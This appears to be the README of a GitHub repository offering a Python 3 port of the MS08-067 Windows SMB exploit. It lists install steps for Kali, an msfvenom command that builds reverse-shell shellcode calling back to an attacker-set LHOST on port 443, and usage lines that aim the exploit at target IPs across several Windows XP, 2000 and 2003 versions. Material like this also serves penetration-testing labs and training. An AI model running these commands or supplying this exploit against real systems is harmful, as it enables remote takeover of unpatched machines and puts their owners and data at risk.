<h1>MS08_067 Exploit Script - Updated 2021 - Python 3 Version</h1>

This is an updated version of the super old MS08-067 exploit script. Versionated to Python 3.

Cloned and edited from this repository:
https://github.com/andyacer/ms08_067

<h2>Use on Kali</h2>

<p>git clone https://github.com/EVL87/ms08_067</p>
<p>cd ms08-067</p>
<p>sudo apt-get install python3-pip</p>
<p>pip install pycrypto</p>

<h2>Generating Shellcode</h2>
<p>Example msfvenom commands to generate shellcode. Just paste these into the file which you'll edit after downloading. 'Cause you're an awesome hacker like that.</p>
<li>msfvenom -p windows/shell_reverse_tcp LHOST=x.x.x.x LPORT=443 EXITFUNC=thread -b "\x00\x0a\x0d\x5c\x5f\x2f\x2e\x40" -f c -a x86 --platform windows</li>

<h2>Usage</h2>
<h3>Usage: python3 ms08-067_p3.py <IP> <os #> <Port #></h3>

<li>python3 ms08-067_p3.py 192.168.1.1 1 445 -- for Windows XP SP0/SP1 Universal, port 445</li>
<li>python3 ms08-067_p3.py 192.168.1.1 2 139 -- for Windows 2000 Universal, port 139 (445 could also be used)</li>
<li>python3 ms08-067_p3.py 192.168.1.1 3 445 -- for Windows 2003 SP0 Universal</li>
<li>python3 ms08-067_p3.py 192.168.1.1 4 445 -- for Windows 2003 SP1 English</li>
<li>python3 ms08-067_p3.py 192.168.1.1 5 445 -- for Windows XP SP3 French (NX)</li>
<li>python3 ms08-067_p3.py 192.168.1.1 6 445 -- for Windows XP SP3 English (NX)</li>
<li>python3 ms08-067_p3.py 192.168.1.1 7 445 -- for Windows XP SP3 English (AlwaysOn NX)</li>
